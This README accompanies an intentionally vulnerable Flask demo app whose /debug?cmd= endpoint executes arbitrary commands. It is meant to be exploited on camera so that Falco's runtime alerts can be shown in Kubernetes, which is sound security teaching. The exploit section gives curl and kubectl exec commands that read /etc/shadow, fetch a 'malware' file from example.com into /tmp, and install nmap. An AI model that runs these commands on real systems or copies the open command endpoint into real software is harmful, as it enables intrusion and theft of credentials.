# Vulnerable Demo Application

## What is this?

A simple Python Flask web app with an intentional RCE (Remote Code Execution) vulnerability.

This simulates a real production application that has a security flaw. You deploy this first, then install Falco, and then exploit this app to show Falco detecting the attack in real-time.

## Why this app has a vulnerability

The `/debug?cmd=` endpoint accepts any command and executes it. In real life, this is what happens when:
- Log4Shell is exploited (Log4j RCE)
- Spring4Shell is exploited
- Any application has an unpatched RCE vulnerability

## The flow for your video

```
Step 1: Deploy this app          → "Here's our production app running normally"
Step 2: Show the app working     → "Users can browse products, check health"
Step 3: Install Falco            → "Now let's add runtime security monitoring"
Step 4: Exploit the vulnerability → "An attacker found the /debug endpoint"
Step 5: Show Falco alerts        → "Falco caught it instantly!"
```

---

## Endpoints

| URL | What it does |
|-----|-------------|
| `/` | Home page |
| `/products` | Product listing |
| `/health` | Health check (JSON) |
| `/debug?cmd=whoami` | ⚠️ RCE — executes any command |

---

## Step-by-Step

### Deploy the app

```bash
bash deploy.sh
```

### Access it

```bash
kubectl port-forward svc/webapp 5000:80
```

Open browser: http://localhost:5000

### Exploit it (after Falco is installed)

```bash
# Attacker discovers the debug endpoint
curl 'http://localhost:5000/debug?cmd=whoami'
curl 'http://localhost:5000/debug?cmd=id'

# Attacker reads sensitive files
curl 'http://localhost:5000/debug?cmd=cat+/etc/shadow'

# Attacker downloads malware
curl 'http://localhost:5000/debug?cmd=wget+http://example.com+-O+/tmp/malware'

# Attacker installs tools
curl 'http://localhost:5000/debug?cmd=apt-get+install+-y+nmap'
```

Each of these triggers a Falco alert.

### Or attack via kubectl exec (simpler for demo)

```bash
kubectl exec deploy/webapp -- sh -c "whoami"
kubectl exec deploy/webapp -- cat /etc/shadow
kubectl exec deploy/webapp -- wget http://example.com -O /tmp/malware
kubectl exec deploy/webapp -- apt-get install -y nmap
```

---

## Cleanup

```bash
kubectl delete -f k8s-deployment.yaml
```

---

## Files

| File | What it does |
|------|-------------|
| `app.py` | Flask web app with RCE vulnerability |
| `requirements.txt` | Python dependencies |
| `Dockerfile` | Container image (if you want to build your own) |
| `k8s-deployment.yaml` | Kubernetes Deployment + Service |
| `deploy.sh` | One-command deploy script |
